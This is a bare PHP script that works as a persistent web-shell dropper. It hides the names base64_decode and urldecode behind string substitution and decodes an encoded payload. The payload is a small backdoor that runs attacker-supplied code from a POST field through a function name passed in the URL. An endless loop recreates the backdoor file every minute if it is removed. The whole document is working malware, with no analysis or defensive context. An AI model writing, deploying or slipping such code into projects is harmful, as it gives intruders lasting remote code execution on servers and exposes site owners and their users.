<?php
ignore_user_abort(true);
set_time_limit(0);
$file = 'hacden.php';
$urld= str_ireplace("uuuiii","ldecode","uruuuiii");
$a = str_ireplace("uuuiii","4_decode","base6uuuiii");
$shell = 'JTNDJTNGcGhwJTBBY2xhc3MlMjBTQmRvZyU3QiUwQSUyMCUyMHB1YmxpYyUyMCUyNHglM0IlMEElMjAlMjBmdW5jdGlvbiUyMGRvZyUyOCUyOSU3QiUwQSUyMCUyMCUyMCUyMCUyNHRoaXMtJTNFeCUzREBzdHJfcmVwbGFjZSUyOHglMkMlMjIlMjIlMkNAJTI0X0dFVCU1QiUyN2IlMjclNUQlMjklM0IlMjAvL2IlM0RheHN4eHN4ZXhyeHh0JTBBJTIwJTIwJTdEJTBBJTdEJTBBJTI0Y2xhc3MlM0RuZXclMjBTQmRvZyUyOCUyOSUzQiUwQSUyNGNsYXNzLSUzRWRvZyUyOCUyOSUzQiUwQSUyNGElM0QlMjRjbGFzcy0lM0V4JTNCJTBBJTI0YSUyOCUyNF9QT1NUJTVCJTIyaGFjZGVuJTIyJTVEJTI5JTNCJTIwJTIwJTBBJTNGJTNFJTI3';
 
while (TRUE) {
if (!file_exists($file)) {
file_put_contents($file, @$urld(@$a($shell)));
}
sleep(60);
}
?>